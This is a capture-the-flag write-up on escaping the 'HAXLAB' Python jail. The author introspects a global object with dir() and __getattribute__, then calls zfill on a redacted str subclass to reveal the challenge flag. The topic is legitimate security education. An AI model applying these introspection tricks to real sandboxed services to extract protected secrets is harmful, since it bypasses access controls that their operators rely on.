# HAXLAB — Flag Leak
PWN - MEDIUM

WU author: `inexp-mf`

## Statement
> Welcome to HAXLAB, the world's most secure MaaS® (math-as-a-service) with advanced functionality.
Note
For this part of the challenge, please submit the contents of `flag1.txt`.
[jail.py](jail.py)
Connect via
`nc haxlab.sdc.tf 1337`

Author: `k3v1n`

## Solution
Having connected, we find ourselves in an interactive python shell.
As the [`jail.py`](jail.py) suggests, 
`global_dict['flag1'] = flag1`. We have the flag stored in a global variable.
Let's try and access it:
```py
>>> dir(flag1)
['-flag1-', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']
>>> flag1.-flag1-
invalid syntax (<string>, line 1)
>>> flag1.__getattribute__('-flag1-')
REDACTED
```
So, a proprietary class with `__repr__` overriden to say "REDACTED". Let's further abuse Python's capabilities to analyze how objects look inside.
```py
>>> redacted = flag1.__getattribute__('-flag1-')
>>> redacted
REDACTED
>>> dir(redacted)
['__add__', '__class__', '__contains__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__module__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']
```
By defined methods it looks like a `str` subclass. Let's check if methods are overriden as well.
```py
>>> redacted.zfill(1)   
'sdctf{get@ttr_r3ads_3v3ryth1ng}\n'
```
Guess they aren't. Cool, we got the flag.